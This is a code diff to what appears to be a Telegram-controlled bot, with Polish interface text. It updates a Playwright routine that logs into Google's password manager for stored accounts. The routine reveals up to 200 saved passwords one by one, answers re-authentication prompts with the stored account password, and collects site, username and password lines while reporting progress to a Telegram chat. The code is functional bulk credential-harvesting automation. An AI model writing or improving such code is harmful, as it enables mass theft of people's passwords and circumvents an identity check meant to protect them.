@@ -278,6 +278,16 @@ async function handleAddAccount(chatId, args, publicHost) {
 
 // ── /panel — inline keyboard main menu ───────────────────────────────────────
 
+async function editMessage(chatId, messageId, text) {
+  try {
+    await fetch(apiUrl('editMessageText'), {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, message_id: messageId, text, disable_web_page_preview: true }),
+    });
+  } catch { /* best-effort */ }
+}
+
 async function sendInlineMessage(chatId, text, inline_keyboard) {
   try {
     await fetch(apiUrl('sendMessage'), {
@@ -462,62 +472,74 @@ async function handleGooglePasswords(chatId, accountId, callbackQueryId) {
       const count = await rows.count().catch(() => 0);
 
       const limit = Math.min(count || 0, 200);
-      await replyTo(chatId, `⏳ Pobieram hasła (${limit} wpisów)...`);
+
+      // Send initial progress message and keep its ID for edits
+      let progressMsgId = null;
+      try {
+        const r = await fetch(apiUrl('sendMessage'), {
+          method: 'POST',
+          headers: { 'content-type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: `🔐 Pobieram hasła: 0 / ${limit}` }),
+        });
+        const d = await r.json();
+        progressMsgId = d.result?.message_id;
+      } catch {}
 
       for (let i = 0; i < limit; i++) {
         try {
           const row = rows.nth(i);
           const rowText = await row.innerText().catch(() => '');
           await row.click({ timeout: 5000 });
-          await pwPage.waitForTimeout(1200);
+          await pwPage.waitForTimeout(800);
 
           // Try to find and click "show password" button (eye icon)
           const eyeBtn = pwPage.locator('button[aria-label*="Show"], button[aria-label*="Pokaż"], button[aria-label*="show"], [aria-label*="password visibility"]').first();
-          if (await eyeBtn.isVisible({ timeout: 2000 }).catch(() => false)) {
+          if (await eyeBtn.isVisible({ timeout: 1500 }).catch(() => false)) {
             await eyeBtn.click().catch(() => {});
-            await pwPage.waitForTimeout(800);
+            await pwPage.waitForTimeout(600);
           }
 
-          // Handle re-auth: Google may ask to confirm identity
+          // Handle re-auth
           const reAuthInput = pwPage.locator('input[type="password"]:visible').first();
-          if (await reAuthInput.isVisible({ timeout: 1500 }).catch(() => false)) {
+          if (await reAuthInput.isVisible({ timeout: 1000 }).catch(() => false)) {
             if (acc.password) {
               await reAuthInput.fill(acc.password);
               await pwPage.keyboard.press('Enter');
-              await pwPage.waitForTimeout(1500);
-              // Click eye again after re-auth
-              if (await eyeBtn.isVisible({ timeout: 1500 }).catch(() => false)) {
+              await pwPage.waitForTimeout(1200);
+              if (await eyeBtn.isVisible({ timeout: 1000 }).catch(() => false)) {
                 await eyeBtn.click().catch(() => {});
-                await pwPage.waitForTimeout(800);
+                await pwPage.waitForTimeout(600);
               }
             }
           }
 
-          // Get revealed password (input type=text after reveal)
-          const pwValue = await pwPage.locator('input[type="text"][aria-label*="asso"], input[type="text"][autocomplete="current-password"], input[type="text"]').first()
-            .inputValue().catch(() => '');
-
-          // Get site and username from detail panel
-          const detailText = await pwPage.locator('[aria-label*="Website"], [aria-label*="site"], [aria-label*="witryn"]').first()
-            .innerText().catch(() => '');
-          const userText = await pwPage.locator('[aria-label*="sername"], [aria-label*="email"], [aria-label*="użytk"]').first()
-            .innerText().catch(() => '');
+          const pwValue = await pwPage.locator('input[type="text"]').first().inputValue().catch(() => '');
+          const detailText = await pwPage.locator('[aria-label*="Website"], [aria-label*="site"], [aria-label*="witryn"]').first().innerText().catch(() => '');
+          const userText   = await pwPage.locator('[aria-label*="sername"], [aria-label*="email"], [aria-label*="użytk"]').first().innerText().catch(() => '');
 
           const site = detailText || rowText.split('\n')[0] || `wpis-${i + 1}`;
-          const user = userText || rowText.split('\n')[1] || '';
+          const user = userText  || rowText.split('\n')[1] || '';
           const pw   = pwValue && !pwValue.includes(MASK) ? pwValue : '(nie udało się)';
-
           results.push(`${site} | ${user} | ${pw}`);
 
-          // Close detail / go back
+          // Close / go back
           const closeBtn = pwPage.locator('button[aria-label*="Close"], button[aria-label*="Zamknij"], button[aria-label*="Back"], [aria-label*="Wróć"]').first();
-          if (await closeBtn.isVisible({ timeout: 1000 }).catch(() => false)) {
+          if (await closeBtn.isVisible({ timeout: 800 }).catch(() => false)) {
             await closeBtn.click().catch(() => {});
           } else {
-            await pwPage.goBack({ timeout: 5000 }).catch(() => {});
+            await pwPage.goBack({ timeout: 4000 }).catch(() => {});
           }
-          await pwPage.waitForTimeout(600);
+          await pwPage.waitForTimeout(400);
         } catch { /* skip broken row */ }
+
+        // Update progress every 10 entries
+        if (progressMsgId && (i + 1) % 10 === 0) {
+          await editMessage(chatId, progressMsgId, `🔐 Pobieram hasła: ${i + 1} / ${limit}`);
+        }
+      }
+
+      if (progressMsgId) {
+        await editMessage(chatId, progressMsgId, `✅ Gotowe: ${results.length} / ${limit} wpisów`);
       }
 
       if (!results.length) {
